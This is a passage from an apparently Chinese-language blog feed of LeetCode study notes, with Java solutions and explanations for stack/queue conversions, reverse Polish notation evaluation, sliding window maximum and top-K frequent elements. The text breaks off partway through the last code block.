class="keyword">return</span> stackOut.pop();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">peek</span><span class="params">()</span> &#123;</span><br><span class="line">        dumpstackIn();</span><br><span class="line">        <span class="keyword">return</span> stackOut.peek();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">empty</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> stackIn.isEmpty() &amp;&amp; stackOut.isEmpty();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">dumpstackIn</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(!stackOut.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(!stackIn.isEmpty()) &#123;</span><br><span class="line">            stackOut.push(stackIn.pop());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your MyQueue object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * MyQueue obj = new MyQueue();</span></span><br><span class="line"><span class="comment"> * obj.push(x);</span></span><br><span class="line"><span class="comment"> * int param_2 = obj.pop();</span></span><br><span class="line"><span class="comment"> * int param_3 = obj.peek();</span></span><br><span class="line"><span class="comment"> * boolean param_4 = obj.empty();</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><h4 id="用队列实现栈"><a href="#用队列实现栈" class="headerlink" title="用队列实现栈"></a>用队列实现栈</h4><p>link：<a href="https://leetcode.cn/problems/implement-stack-using-queues/description/">225. 用队列实现栈 - 力扣（LeetCode）</a></p><h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><p>由于队列是先进先出 想要模拟栈第二个队列就是起到备份的作用.<br>我们要获取q1最后入列的元素 那么就需要q2中间搭桥：<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20241025222720745.png" alt="image-20241025222720745"></p><h6 id="双队列解决"><a href="#双队列解决" class="headerlink" title="双队列解决"></a>双队列解决</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyStack</span> &#123;</span><br><span class="line">      Queue&lt;Integer&gt; queue1;</span><br><span class="line">      Queue&lt;Integer&gt; queue2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyStack</span><span class="params">()</span> &#123;</span><br><span class="line">      queue1 = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">      queue2 = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();  </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">push</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">        queue2.offer(x);</span><br><span class="line">        <span class="keyword">while</span>(!queue1.isEmpty())&#123;</span><br><span class="line">            queue2.add(queue1.poll());</span><br><span class="line">            <span class="comment">//其实在无容量限制的情况下保持一致使用offer或者add</span></span><br><span class="line">        &#125;</span><br><span class="line">            Queue&lt;Integer&gt; temp = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">            temp = queue1;</span><br><span class="line">            queue1 = queue2;</span><br><span class="line">            queue2 = temp; </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">pop</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> queue1.poll();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">top</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> queue1.peek();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">empty</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> queue1.isEmpty();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your MyStack object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * MyStack obj = new MyStack();</span></span><br><span class="line"><span class="comment"> * obj.push(x);</span></span><br><span class="line"><span class="comment"> * int param_2 = obj.pop();</span></span><br><span class="line"><span class="comment"> * int param_3 = obj.top();</span></span><br><span class="line"><span class="comment"> * boolean param_4 = obj.empty();</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><h5 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h5><p>在 <code>push</code> 方法中，使用 <code>offer</code> 和 <code>add</code> 都可以将元素插入到 <code>queue2</code> 中，但这两者有细微的区别。下面是解释为什么这里使用了 <code>add</code> 和 <code>offer</code>：</p><h3 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h3><ul><li>**<code>offer(E e)</code>**：用于将元素插入到队列的尾部。如果队列有容量限制（如在阻塞队列中），而队列已满，<code>offer</code> 会返回 <code>false</code>，表示添加失败。</li><li>**<code>add(E e)</code>**：同样将元素插入到队列的尾部，但如果队列已满（有容量限制时），<code>add</code> 会抛出 <code>IllegalStateException</code>。</li></ul><p>在 <code>MyStack</code> 实现中，因为使用的是 <code>LinkedList</code> 作为队列的底层实现，<code>LinkedList</code> 本身没有容量限制，所以在实际操作中 <code>add</code> 和 <code>offer</code> 的行为是相同的。</p><h3 id="为什么-push-中既使用了-offer-又使用了-add"><a href="#为什么-push-中既使用了-offer-又使用了-add" class="headerlink" title="为什么 push 中既使用了 offer 又使用了 add"></a>为什么 <code>push</code> 中既使用了 <code>offer</code> 又使用了 <code>add</code></h3><ol><li><strong><code>offer</code></strong> 用于将新元素 <code>x</code> 加入 <code>queue2</code>。这是因为这个元素是新插入的，并且它是我们希望最终在栈顶部的元素。</li><li><strong><code>add</code></strong> 用于将 <code>queue1</code> 中剩余的所有元素移动到 <code>queue2</code>。在这个上下文中，<code>queue1.poll()</code> 会将 <code>queue1</code> 的元素逐个取出并添加到 <code>queue2</code>。这里使用 <code>add</code> 或 <code>offer</code> 都没有影响，因为 <code>LinkedList</code> 没有容量限制。</li></ol><h6 id="单队列解决"><a href="#单队列解决" class="headerlink" title="单队列解决"></a>单队列解决</h6><p>其实最开始思考用队列实现栈把末尾入队的元素放到队头即可 但是没有对知识点进行清晰的掌握 下附妙招.<br><strong>Deque继承了Queue接口</strong><br><strong>Queue 中的 add、poll、peek等效于 Deque 中的 addLast、pollFirst、peekFirst</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyStack</span> &#123;</span><br><span class="line">    Deque&lt;Integer&gt; que1;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyStack</span><span class="params">()</span> &#123;</span><br><span class="line">        que1 = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">push</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">        que1.addLast(x);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">pop</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> que1.size()-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(tmp&gt;<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            que1.addLast(que1.peekFirst());</span><br><span class="line">            que1.pollFirst();</span><br><span class="line">            tmp--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> que1.pollFirst();</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">top</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> que1.peekLast();</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">empty</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> que1.isEmpty();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your MyStack object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * MyStack obj = new MyStack();</span></span><br><span class="line"><span class="comment"> * obj.push(x);</span></span><br><span class="line"><span class="comment"> * int param_2 = obj.pop();</span></span><br><span class="line"><span class="comment"> * int param_3 = obj.top();</span></span><br><span class="line"><span class="comment"> * boolean param_4 = obj.empty();</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>yubのAlgorithm.0xe</title>
      <link href="/2024/11/08/yub%E3%81%AEAlgorithm.0xe/"/>
      <url>/2024/11/08/yub%E3%81%AEAlgorithm.0xe/</url>
      
        <content type="html"><![CDATA[<h5 id="逆波兰表达式求值"><a href="#逆波兰表达式求值" class="headerlink" title="逆波兰表达式求值"></a>逆波兰表达式求值</h5><p>link：<a href="https://leetcode.cn/problems/evaluate-reverse-polish-notation/description/">150. 逆波兰表达式求值 - 力扣（LeetCode）</a></p><h6 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h6><p>最开始的思路就是用栈解决，非运算符号的先入栈，遇到运算符再出栈对运算符进行判断之后进行相应的运算最后出栈即可.<br><strong>【注意一点】</strong><br> 为了保证运算顺序，运算都是num2对num1操作（因为先进后出）</p><p>前提是搞懂逆波兰式<br>本质是二叉树中的中序遍历变成了后序遍历.</p><h6 id="暴力版"><a href="#暴力版" class="headerlink" title="暴力版"></a>暴力版</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">evalRPN</span><span class="params">(String[] tokens)</span> &#123;</span><br><span class="line">        Stack&lt;Integer&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> num1,num2;</span><br><span class="line">        <span class="keyword">for</span>(String s:tokens)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(s.equals(<span class="string">&quot;+&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">               stack.push(stack.pop()+stack.pop());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(s.equals(<span class="string">&quot;-&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                stack.push(-stack.pop()+stack.pop());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(s.equals(<span class="string">&quot;*&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                stack.push(stack.pop()*stack.pop());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(s.equals(<span class="string">&quot;/&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">tmp1</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">                <span class="type">int</span> <span class="variable">tmp2</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">                stack.push(tmp2/tmp1);   </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                stack.push(Integer.valueOf(s));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stack.pop();</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="优化版"><a href="#优化版" class="headerlink" title="优化版"></a>优化版</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">evalRPN</span><span class="params">(String[] tokens)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(tokens == <span class="literal">null</span> || tokens.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        LinkedList&lt;Integer&gt; stack = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        Set&lt;String&gt; operators = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;String&gt;();</span><br><span class="line">        operators.add(<span class="string">&quot;+&quot;</span>);</span><br><span class="line">        operators.add(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">        operators.add(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">        operators.add(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(String str : tokens) &#123;</span><br><span class="line">            <span class="keyword">if</span>(!operators.contains(str)) &#123;</span><br><span class="line">                stack.push(Integer.valueOf(str));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">num1</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">                <span class="type">int</span> <span class="variable">num2</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">                <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span>(str.equals(<span class="string">&quot;+&quot;</span>)) &#123;</span><br><span class="line">                    result = num2 + num1;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span>(str.equals(<span class="string">&quot;-&quot;</span>)) &#123;</span><br><span class="line">                    result = num2 - num1;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span>(str.equals(<span class="string">&quot;*&quot;</span>)) &#123;</span><br><span class="line">                    result = num2 * num1;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    result = num2 / num1;</span><br><span class="line">                &#125;</span><br><span class="line">                stack.push(result);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stack.pop();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a><strong>Tips</strong></h6><p>HashSet<code>数据结构的</code>contains()<code>操作平均时间复杂度为</code>O(1).<br><code>LinkedList</code> 的 <code>push</code> 和 <code>pop</code> 操作时间复杂度为 <code>O(1)</code>，因为它们只涉及在列表头部添加或移除元素<br><code>Set</code> 本身具有防止重复的特性，即使重复添加同一个运算符（如 <code>+</code>、<code>-</code>、<code>*</code>、<code>/</code>），集合中也只会保留一个实例。尽管在这个场景中并不特别关键，但这种特性在处理独特元素时非常有用.</p><h5 id="滑动窗口的最大值"><a href="#滑动窗口的最大值" class="headerlink" title="滑动窗口的最大值"></a><a href="https://so.csdn.net/so/search?q=%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3&spm=1001.2101.3001.7020">滑动窗口</a>的最大值</h5><p>link：<a href="https://leetcode.cn/problems/sliding-window-maximum/description/">239. 滑动窗口最大值 - 力扣（LeetCode）</a></p><h6 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h6><p>看到题目hard不要着急，尝试分析，最开始接触的滑动窗口也是用<strong>双端队列</strong>【<code>Deque</code>（双端队列）在 Java 中的典型实现是基于<strong>循环数组</strong>或<strong>双向链表</strong>】实现（不用暴力是因为时间复杂度肉眼可见的高）那么在这里是否也可以用呢？<br>根据样例分析发现规律：假设数组nums长度为n，那么滑动窗口的移动次数【也可以叫做移动范围吧】为n-k+1，所以我们结果集res的长度就是n-k+1.<br>最后就是同样的思路进行筛选比较遍历得到结果.<br><strong>注意 <code>deque</code> 中存储的是数组 <code>nums</code> 的索引</strong><br><code>ArrayDeque</code> 使用一个<strong>动态循环数组</strong>来存储元素，通过动态调整数组大小来处理空间需求</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] maxSlidingWindow(<span class="type">int</span>[] nums, <span class="type">int</span> k) &#123;</span><br><span class="line">        <span class="comment">//创建 </span></span><br><span class="line">        ArrayDeque&lt;Integer&gt; deque = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//定义res</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[n - k + <span class="number">1</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">           <span class="comment">//队列头结点需要在[i - k + 1, i]范围内，不符合则要弹出</span></span><br><span class="line">            <span class="keyword">while</span>(!deque.isEmpty() &amp;&amp; deque.peek() &lt; i - k + <span class="number">1</span>) &#123;</span><br><span class="line">                deque.poll();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//比较新来的单词和原判断的单词 大了更新小了poll</span></span><br><span class="line">            <span class="keyword">while</span>(!deque.isEmpty() &amp;&amp; nums[deque.peekLast()] &lt; nums[i]) &#123;</span><br><span class="line">                deque.pollLast();</span><br><span class="line">            &#125;</span><br><span class="line">            deque.offer(i);</span><br><span class="line">            <span class="keyword">if</span>(i &gt;= k-<span class="number">1</span>) &#123;</span><br><span class="line">                res[index++] = nums[deque.peek()];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="Tips-1"><a href="#Tips-1" class="headerlink" title="Tips"></a>Tips</h6><h3 id="为什么使用索引而不是直接存值？"><a href="#为什么使用索引而不是直接存值？" class="headerlink" title="为什么使用索引而不是直接存值？"></a>为什么使用索引而不是直接存值？</h3><p>使用索引而非直接存值有几个好处：</p><ul><li><strong>保持对原始数组的引用</strong>：存储索引可以在 <code>nums</code> 中轻松访问这些值，无需额外的存储空间。</li><li><strong>维护窗口的有效性</strong>：在滑动窗口中移动时，可以根据索引来判断元素是否超出窗口范围（即 <code>deque.peek() &lt; i - k + 1</code>），这在直接存值的情况下较难实现。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>yubのAlgorithm.0xf</title>
      <link href="/2024/11/08/yub%E3%81%AEAlgorithm.0xf/"/>
      <url>/2024/11/08/yub%E3%81%AEAlgorithm.0xf/</url>
      
        <content type="html"><![CDATA[<h4 id="前K个高频元素"><a href="#前K个高频元素" class="headerlink" title="前K个高频元素"></a>前K个高频元素</h4><p>link:<a href="https://leetcode.cn/problems/top-k-frequent-elements/">347. 前 K 个高频元素 - 力扣（LeetCode）</a></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>对于统计元素出现的频率，这一类问题可以用map来进行统计（key和value无敌）key存放元素，value存放出现的频率.<br>其实最开始想到的是暴力的遍历循环，逐个判断计数排列，剔除出现频率最小的元素.想用set但是不匹配统计频率的要求.就需要Set和Lsit结合.最后发现还是离不开心爱的map啊（大顶堆秒了）</p><h6 id="大顶堆实现"><a href="#大顶堆实现" class="headerlink" title="大顶堆实现"></a>大顶堆实现</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] topKFrequent(<span class="type">int</span>[] nums, <span class="type">int</span> k) &#123;</span><br><span class="line">        <span class="comment">//创建Map</span></span><br><span class="line">        Map&lt;Integer,Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> num:nums) &#123;</span><br><span class="line">            <span class="comment">//确保更新元素</span></span><br><span class="line">            map.put(num,map.getOrDefault(num,<span class="number">0</span>)+<span class="number">1</span>);</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="comment">//优先级队列存储(num，count)按从大到小排</span></span><br><span class="line">        PriorityQueue&lt;<span class="type">int</span>[]&gt; pq = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;((pair,pair1)-&gt;pair1[<span class="number">1</span>]-pair[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">for</span>(Map.Entry&lt;Integer,Integer&gt;entry:map.entrySet())&#123;</span><br><span class="line">            pq.add(<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;entry.getKey(),entry.getValue()&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[] result = <span class="keyword">new</span> <span class="title class_">int</span>[k];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">            result[i] = pq.poll()[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="小顶堆实现"><a href="#小顶堆实现" class="headerlink" title="小顶堆实现"></a>小顶堆实现</h6><p><strong>注意 小顶堆由于出现频率少的在前面 所以要先剔除频率最小的元素以及不足k个的情况单独优先考虑</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] topKFrequent(<span class="type">int</span>[] nums, <span class="type">int</span> k) &#123;</span><br><span class="line">        Map&lt;Integer,Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();<span class="comment">//key为数组元素值,val为对应出现次数</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> num:nums)&#123;</span><br><span class="line">            map.put(num,map.getOrDefault(num,<span class="number">0</span>)+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//出现次数最低的在队头</span></span><br><span class="line">        PriorityQueue&lt;<span class="type">int</span>[]&gt; pq = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;((pair1,pair2)-&gt;pair1[<span class="number">1</span>]-pair2[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">for</span>(Map.Entry&lt;Integer,Integer&gt; entry:map.entrySet())&#123;</span><br><span class="line">            <span class="comment">//小顶堆只需要维持k个元素有序</span></span><br><span class="line">            <span class="keyword">if</span>(pq.size()&lt;k)&#123;</span><br><span class="line">                <span class="comment">//小顶堆元素个数小于k个时直接加</span></span><br><span class="line">                pq.add(<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;entry.getKey(),entry.getValue()&#125;);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(entry.getValue()&gt;pq.peek()[<span class="number">1</span>])&#123;</span><br><span class="line">                    <span class="comment">//当前元素出现次数大于小顶堆的根结点(这k个元素中出现次数最少的那个)</span></span><br><span class="line">                    pq.poll();</span><br><span class="line">                    <span class="comment">//弹出队头(小顶堆的根结点),即把堆里出现次数最少的那个删除,留下的就是出现次数多的了</span></span><br><span class="line">                    pq.add(<span class="keyword">new</span> <span class="title 